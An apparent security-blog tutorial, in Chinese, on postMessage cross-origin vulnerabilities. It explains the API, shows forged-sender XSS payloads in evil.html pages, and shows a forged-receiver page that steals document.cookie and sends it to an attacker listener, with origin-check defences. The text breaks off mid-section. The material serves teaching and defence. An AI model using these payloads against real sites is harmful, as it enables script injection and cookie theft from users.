<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Wiki</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2020-04-06T14:14:08.737Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>postMessage跨域漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2020/04/06/%E6%B5%85%E6%9E%90postMessage%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2020/04/06/浅析postMessage安全/</id>
    <published>2020-04-06T04:46:28.000Z</published>
    <updated>2020-04-06T14:14:08.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="何为postMessage"><a href="#何为postMessage" class="headerlink" title="何为postMessage"></a>何为postMessage</h3><p>一般的，由于同源策略（SOP）的限制，不同域之间是无法进行通信的。</p><p>我们知道常见的跨域技术有JSONP、CORS等。除此之外，在HTML5中新增了postMessage方法来实现跨域通信，postMessage可以实现跨文档消息传输（Cross Document Messaging），Internet Explorer 8, Firefox 3, Opera 9, Chrome 3和 Safari 4都支持postMessage。</p><p>postMessage可以通过绑定window的message事件来监听发送跨文档消息传输内容。</p><p>API参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><h4 id="函数基本语法"><a href="#函数基本语法" class="headerlink" title="函数基本语法"></a>函数基本语法</h4><p>postMessage()函数基本语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.postMessage(message, targetOrigin, [transfer]);</span><br></pre></td></tr></table></figure><ul><li>otherWindow：其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames。</li><li>message：将要发送到其他 window的数据。它将会被结构化克隆算法序列化。这意味着你可以不受什么限制的将数据对象安全的传送给目标窗口而无需自己序列化。</li><li>targetOrigin：通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串<code>*</code>（表示无限制）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。这个机制用来控制消息可以发送到哪些窗口；例如，当用postMessage传送密码时，这个参数就显得尤为重要，必须保证它的值与这条包含密码的信息的预期接受者的origin属性完全一致，来防止密码被恶意的第三方截获。如果你明确的知道消息应该发送到哪个窗口，那么请始终提供一个有确切值的targetOrigin，而不是<code>*</code>。不提供确切的目标将导致数据泄露到任何对数据感兴趣的恶意站点。</li><li>transfer（可选）：是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。</li></ul><h4 id="子窗口引用获取"><a href="#子窗口引用获取" class="headerlink" title="子窗口引用获取"></a>子窗口引用获取</h4><p>postMessage在通信之前，父窗口需要先获得子窗口的引用，存在两个情况：</p><ul><li>获取iframe的引用；</li><li>获取window.open的引用；</li></ul><p>后面的示例以iframe引用为例。</p><h4 id="父窗口-gt-子窗口"><a href="#父窗口-gt-子窗口" class="headerlink" title="父窗口 -&gt; 子窗口"></a>父窗口 -&gt; 子窗口</h4><p>父窗口 father.com 向子窗口 son.com 发消息，调用postMessage方法即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> receiver = <span class="built_in">window</span>.open(<span class="string">'http://son.com'</span>, <span class="string">'title'</span>);</span><br><span class="line">receiver.postMessage(<span class="string">'HelloWorld!'</span>, <span class="string">'http://son.com'</span>);</span><br></pre></td></tr></table></figure><p>postMessage()函数的第一个参数是消息内容，第二个参数是接收消息的窗口的源，也可以设置为<code>*</code>，表示不限定域名，向所有窗口发送消息。</p><h4 id="子窗口-gt-父窗口"><a href="#子窗口-gt-父窗口" class="headerlink" title="子窗口 -&gt; 父窗口"></a>子窗口 -&gt; 父窗口</h4><p>子窗口发送消息的方法类似：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.opener.post(<span class="string">'Nice to meet you'</span>, <span class="string">'http://father.com'</span>);</span><br></pre></td></tr></table></figure><h4 id="监听消息"><a href="#监听消息" class="headerlink" title="监听消息"></a>监听消息</h4><p>父窗口和子窗口都可以通过message事件来监听对方的消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//event.data就是接收到的数据</span></span><br><span class="line">    <span class="built_in">console</span>.log(event.data);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>message事件的事件对象，提供三个对象：</p><h5 id="event-source"><a href="#event-source" class="headerlink" title="event.source"></a>event.source</h5><p>event.source表示发送对象的窗口。</p><p>子窗口可以通过event.source属性引用父窗口，然后发送消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, receiveMessage);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.source.postMessage(<span class="string">'Nice to see you!'</span>, <span class="string">'*'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="event-origin"><a href="#event-origin" class="headerlink" title="event.origin"></a>event.origin</h5><p>event.origin表示消息发往的地址。</p><p>可以使用event.origin来过滤不是发送给本窗口的消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, receiveMessage);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.origin !== <span class="string">'http://father.com'</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (event.data == <span class="string">'HelloWorld!'</span>) &#123;</span><br><span class="line">        event.source.postMessage(<span class="string">'Hello'</span>, event.origin);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(event.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="event-data"><a href="#event-data" class="headerlink" title="event.data"></a>event.data</h5><p>event.data表示消息内容。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>father.html，父iframe，运行在127.0.0.1这个域iframe引入位于192.168.203.1的子窗口：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Father<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Father's Page<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"send"</span>&gt;</span>Send Message<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span> <span class="attr">id</span>=<span class="string">"receiver"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> receiver = <span class="built_in">document</span>.getElementById(<span class="string">'receiver'</span>).contentWindow;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'send'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span><span class="params">(e)</span></span>&#123;</span></span><br><span class="line"><span class="undefined">e.preventDefault();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> val = <span class="built_in">document</span>.getElementById(<span class="string">'text'</span>).value;</span></span><br><span class="line"><span class="actionscript">receiver.postMessage(val, <span class="string">"http://192.168.203.1"</span>);</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>child.html，子iframe，运行在192.168.203.1这个域，监听回复位于127.0.0.1的父窗口：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Child<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">Hello World!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> messageEle = <span class="built_in">document</span>.getElementById(<span class="string">'message'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (e.origin !== <span class="string">"http://127.0.0.1"</span>) &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript">messageEle.innerHTML = <span class="string">"Received Message: "</span> + e.data;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终效果如下：</p><p><img src="/2020/04/06/浅析postMessage安全/1.png" alt=""></p><h2 id="0x02-postMessage跨域漏洞"><a href="#0x02-postMessage跨域漏洞" class="headerlink" title="0x02 postMessage跨域漏洞"></a>0x02 postMessage跨域漏洞</h2><p>postMessage跨域漏洞主要包括两大类：</p><ul><li>伪造数据发送端，造成XSS等问题；</li><li>伪造数据接收端，窃取用户数据，类似于JSONP劫持漏洞；</li></ul><h3 id="伪造数据发送端"><a href="#伪造数据发送端" class="headerlink" title="伪造数据发送端"></a>伪造数据发送端</h3><p>当接收端接收任意窗口的消息，未对父窗口来源进行限制并将消息输出时，此时攻击者可以伪造数据发送端来进行各种危险操作。比如订单支付时，父窗口传输订单详情，子窗口处理支付流程，攻击者可以伪造父窗口来篡改订单详情，让用户支付了本不属于自己的订单。</p><p>接下来以伪造父窗口，导致XSS为例。</p><h4 id="iframe引用"><a href="#iframe引用" class="headerlink" title="iframe引用"></a>iframe引用</h4><p>child.html，接受任意窗口的消息，并对消息进行输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web page from child.com<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">// event参数中有data属性，就是父窗口发送过来的数据</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 把父窗口发送过来的数据显示在子窗口中</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"content"</span>).innerHTML += event.data + <span class="string">"origin: "</span> + event.origin + <span class="string">"&lt;br/&gt;"</span>; </span></span><br><span class="line"><span class="actionscript">&#125;, <span class="literal">false</span>); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Web page from http://child.com</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.html，放置在攻击者服务器attack.com中，将child.com/child.html通过iframe引入其中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span> <span class="attr">id</span>=<span class="string">"otherPage"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> i = <span class="built_in">document</span>.getElementById(<span class="string">"otherPage"</span>);</span></span><br><span class="line"><span class="actionscript">i.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">i.contentWindow.postMessage(<span class="string">"&lt;img src=x onerror='alert(document.location);'"</span>, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后诱使用户访问attack.com/evil.html，即可触发XSS：</p><p><img src="/2020/04/06/浅析postMessage安全/2.png" alt=""></p><h4 id="window-open引用"><a href="#window-open引用" class="headerlink" title="window.open引用"></a>window.open引用</h4><p>如果目标站点设置了X-Frame-Options时，则无法通过使用iframe，此时需要通过window.open来引用了。</p><p>child.php，设置了X-Frame-Options为同源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;?php header(&apos;X-Frame-Options: SAMEORIGIN&apos;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Web page from child.com&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">// event参数中有data属性，就是父窗口发送过来的数据</span><br><span class="line">window.addEventListener(&quot;message&quot;, function(event) &#123;</span><br><span class="line">// 把父窗口发送过来的数据显示在子窗口中</span><br><span class="line">document.getElementById(&quot;content&quot;).innerHTML += event.data + &quot;origin: &quot; + event.origin + &quot;&lt;br/&gt;&quot;; </span><br><span class="line">&#125;, false); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Web page from http://child.com</span><br><span class="line">&lt;div id=&quot;content&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> receiver = <span class="built_in">window</span>.open(<span class="string">'http://192.168.203.1/child.php'</span>, <span class="string">'title'</span>);</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">receiver.postMessage(<span class="string">"&lt;img src=x onerror='alert(document.location);'"</span>, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">setTimeout(post, 1000);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使用户访问，window.open会新建一个标签访问然后触发XSS：</p><p><img src="/2020/04/06/浅析postMessage安全/3.png" alt=""></p><h4 id="排查方法"><a href="#排查方法" class="headerlink" title="排查方法"></a>排查方法</h4><p>在Chrome中的Global Listeners出查看当前页面存在几个监听器，然后逐个打断点调试分析：</p><p><img src="/2020/04/06/浅析postMessage安全/4.png" alt=""></p><p>找到对应的监听器后，可以在Console中使用如下payload进行调试：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.postMessage(<span class="string">'mi1k7ea'</span>, <span class="string">'*'</span>);</span><br></pre></td></tr></table></figure><p><img src="/2020/04/06/浅析postMessage安全/5.png" alt=""></p><h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h4><p>子窗口对于父窗口的来源应设置白名单判断，只接受可信父窗口传输的数据，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// event参数中有data属性，就是父窗口发送过来的数据</span></span></span><br><span class="line"><span class="actionscript">onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (event.origin == <span class="string">'http://father.com'</span>)&#123;</span></span><br><span class="line"><span class="undefined">            /*</span></span><br><span class="line"><span class="actionscript">            to <span class="keyword">do</span> something</span></span><br><span class="line"><span class="undefined">            */</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此外，还可以设置X-Frame-Options头为白名单域，提高利用门槛。</p><h3 id="伪造数据接收端"><a href="#伪造数据接收端" class="headerlink" title="伪造数据接收端"></a>伪造数据接收端</h3><p>如果数据接收端是如下的写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">targetWindow.postMessage(message, <span class="string">'*'</span>);</span><br></pre></td></tr></table></figure><p>这表明该消息任何窗口都可以接收到，但这里重点不是“攻击者能不能接收到”，而是“发不发给攻击者”。换句话说，如果targetWindow是子窗口的话，除非我们可以控制它的子窗口，否则是无法接收到消息的，即使该消息允许任何窗口接收。</p><p>但是，当消息发送给window.parent或window.opener时，则可以进行攻击利用，窃取用户敏感信息。</p><h4 id="window-parent"><a href="#window-parent" class="headerlink" title="window.parent"></a>window.parent</h4><p>window.parent中parent表示父窗口，比如一个A页面利用iframe或frame调用B页面，那么A页面就是B页面的parent。</p><p>child.html，将消息发送给引用本页面的父窗口：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>User info center<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> userinfo = <span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.parent.postMessage(userinfo, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Web page from http://child.com </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span>(event.origin == <span class="string">"http://192.168.203.1"</span>)&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span></span><br><span class="line"><span class="actionscript">img.src = <span class="string">'http://127.0.0.1:1234/userinfo='</span> + event.data;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"otherPage"</span>).appendChild(img);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span> <span class="attr">id</span>=<span class="string">"otherPage"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使访问，在攻击者服务器上成功窃取到用户信息：</p><p><img src="/2020/04/06/浅析postMessage安全/6.png" alt=""></p><p>当然，直接弹框也是ok的，改下evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">alert(event.origin + <span class="string">" say: \n"</span> + event.data);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/06/浅析postMessage安全/7.png" alt=""></p><h4 id="window-opener"><a href="#window-opener" class="headerlink" title="window.opener"></a>window.opener</h4><p>window.opener中的opener表示谁打开我的，比如一个A页面利用window.open弹出了B页面，那么A页面就是B页面的opener。</p><p> child.html，和前面的几乎一样，只是将window.parent改为window.opener而已：</p><figure class="highlight 